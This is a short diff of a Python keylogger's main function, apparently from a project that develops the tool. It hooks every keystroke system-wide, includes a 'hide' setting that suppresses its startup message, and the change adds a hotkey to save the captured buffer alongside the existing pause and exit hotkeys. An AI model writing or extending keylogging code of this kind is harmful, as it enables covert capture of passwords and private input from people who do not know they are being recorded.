@@ -170,8 +170,10 @@ def main():
     if not config["hide"] or (config["mode"] == 'debug'):
         print(LOGGER_NAME + " started")
     keyboard.hook(key_callback)
-    # To Pause the Keylogger (ctrl + alt + e)
+    # To Pause the Keylogger (ctrl + alt + p)
     keyboard.add_hotkey(config["hotkeys"]["pause-hotkey"], pause_logging)
+    # To save the buffer (ctrl + alt + s)
+    keyboard.add_hotkey(config["hotkeys"]["save-hotkey"], log_local)
     # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
     keyboard.wait(config["hotkeys"]["exit-hotkey"]) 
     global line_buffer
